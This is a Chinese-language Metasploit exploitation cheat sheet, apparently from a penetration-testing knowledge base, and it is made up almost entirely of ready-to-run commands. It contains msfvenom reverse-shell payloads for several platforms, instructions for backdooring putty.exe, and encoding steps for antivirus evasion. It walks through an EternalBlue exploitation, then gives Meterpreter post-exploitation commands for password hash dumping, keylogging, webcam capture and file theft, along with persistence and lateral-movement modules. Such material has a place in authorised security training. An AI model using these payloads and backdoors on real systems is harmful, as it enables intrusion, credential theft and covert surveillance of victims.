---
id: 03-002
title: "💀 Metasploit框架利用 (Metasploit Framework Exploitation)"
category: 漏洞利用
category_en: Exploitation
difficulty: ★★★
tools: "Metasploit Framework, MSFVenom"
last_updated: 2025-07
tags: ["exploitation", "web-attack", "sql-injection", "penetration-testing", "metasploit"]
subdomain: exploitation
nist_csf: ["DE.CM-08", "PR.IP-12"]
mitre_attack: ["T1190", "T1505", "T1203", "T1210"]
---
# 💀 Metasploit框架利用 (Metasploit Framework Exploitation)

## 概述
使用Metasploit框架发现漏洞、生成利用载荷、建立会话并进行后渗透操作。

## 核心技能

### 1. Metasploit基础操作

```bash
# 启动MSF
msfconsole
msfconsole -q  # 静默启动

# 数据库配置（推荐）
msfdb init
msfdb run

# 帮助命令
help
help search     # 搜索帮助
help exploit    # 利用帮助
```

### 2. 漏洞搜索与选择

```msf
# 搜索漏洞
search type:exploit platform:windows cve:2024
search type:exploit platform:linux rank:excellent
search eternalblue
search ms17-010
search name:tomcat
search cve:2021-44228 log4j

# 按类别搜索
search type:auxiliary
search type:post
search type:payload

# 选择模块
use exploit/windows/smb/ms17_010_eternalblue

# 查看模块信息
info
show options
show targets
```

### 3. Payload生成

```bash
# MSFConsole内生成payload
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444

# 使用msfvenom生成payload
# Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o shell_ssl.exe

# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# Web Payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp

# Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o app.apk

# macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o shell.macho

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o shell.py

# 编码/免杀
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x64/xor -i 5 -f exe -o encoded.exe

# 捆绑到正常程序
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /usr/share/windows-binaries/putty.exe -f exe -o putty_backdoor.exe

# 生成多种格式
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-reflection > shell.ps1
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f base64 > shell.txt
```

### 4. 完整利用流程

```msf
# 1. 启动并配置数据库
msfdb run
workspace -a pentest_project
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# 2. 信息收集
use auxiliary/scanner/portscan/tcp
set PORTS 1-1024
run

use auxiliary/scanner/smb/smb_version
run

use auxiliary/scanner/http/http_version
run

# 3. 漏洞利用
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
check
run

# 4. Meterpreter会话操作
# 获取到meterpreter后:
sysinfo
getuid
getsystem
hashdump
screenshot
shell
upload /path/to/tool.exe C:\\Windows\\Temp\\
download C:\\Users\\Administrator\\Desktop\\passwords.txt
ps
migrate -N explorer.exe
keyscan_start
keyscan_dump
webcam_snap
route add 10.0.0.0 255.0.0.0 1  # 添加路由
background

# 5. 会话管理
sessions -l           # 列出会话
sessions -i 1         # 交互会话1
sessions -u 1         # 升级会话
sessions -k 1         # 终止会话
```

### 5. 常见漏洞利用模块

```msf
# Web漏洞
use exploit/multi/http/struts2_content_type_ognl  # Struts2
use exploit/multi/http/log4shell_header_injection  # Log4j
use exploit/multi/http/thinkphp_rce               # ThinkPHP
use exploit/multi/http/wordpress_admin_shell_upload  # WordPress
use exploit/unix/webapp/drupal_drupalgeddon2       # Drupal
use exploit/multi/http/tomcat_mgr_upload           # Tomcat
use exploit/multi/http/jboss_maindeployer          # JBoss

# SMB漏洞
use exploit/windows/smb/ms17_010_eternalblue    # EternalBlue
use exploit/windows/smb/ms08_067_netapi          # MS08-067
use exploit/windows/smb/psexec                   # PsExec

# 远程服务
use exploit/linux/samba/is_known_pipename        # Samba
use exploit/linux/postgres/postgres_payload      # PostgreSQL
use exploit/multi/mysql/mysql_udf_payload        # MySQL
use exploit/unix/ssh/exim4_smtp_overflow         # SSH/Exim

# 浏览器漏洞
use exploit/multi/browser/java_signed_applet     # Java
use exploit/windows/browser/ie_execcomand_uaf    # IE

# 本地提权
use exploit/windows/local/ms16_075_reflection    # Potato
use exploit/windows/local/ms18_8120_win32k       # Win32k
use exploit/linux/local/suid_cmd                 # SUID
use exploit/linux/local/glibc_ld_audit_dynload  # glibc
```

### 6. 后渗透模块

```msf
# 凭据收集
use post/windows/gather/credentials/windows_autologin
use post/windows/gather/enum_shares
use post/linux/gather/enum_configs
use post/multi/gather/ssh_creds

# 权限提升
use post/multi/recon/local_exploit_suggester
use exploit/windows/local/ms16_075_reflection
use exploit/linux/local/suid_cmd

# 持久化
use exploit/windows/local/persistence_service
use post/windows/manage/enable_rdp
use post/linux/manage/sshkey_persistence

# 横向移动
use exploit/windows/local/psexec
use auxiliary/scanner/smb/impacket/wmiexec
```

### 7. 攻击载荷编码与免杀

```bash
# 多次编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -i 10 -e x86/shikata_ga_nai -f exe -o multi_encoded.exe

# 自定义模板
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -x custom.exe -k -f exe -o backdoor.exe

# HTTrack打包
# 先下载一个完整的网站，将payload捆绑到HTML文件中

# PowerShell内存加载（无文件）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh-reflection -o shell.ps1
# 在目标上执行: powershell -ExecutionPolicy Bypass -File shell.ps1
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Metasploit | 漏洞利用框架 | https://www.metasploit.com/ |
| msfvenom | Payload生成器 | Metasploit内置 |
| Armitage | MSF GUI界面 | https://github.com/rsmudge/armitage |
| Cobalt Strike | 商业后渗透平台 | https://www.cobaltstrike.com/ |
| Empire | PowerShell后渗透 | https://github.com/BC-SECURITY/Empire/ |

## 参考资源
- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
- [Metasploit Wiki](https://github.com/rapid7/metasploit-framework/wiki)
- [Rapid7 Metasploit Blog](https://blog.rapid7.com/category/metasploit/)
- [MSFVenom Cheatsheet](https://book.hacktricks.xyz/shells/shells/msfvenom)
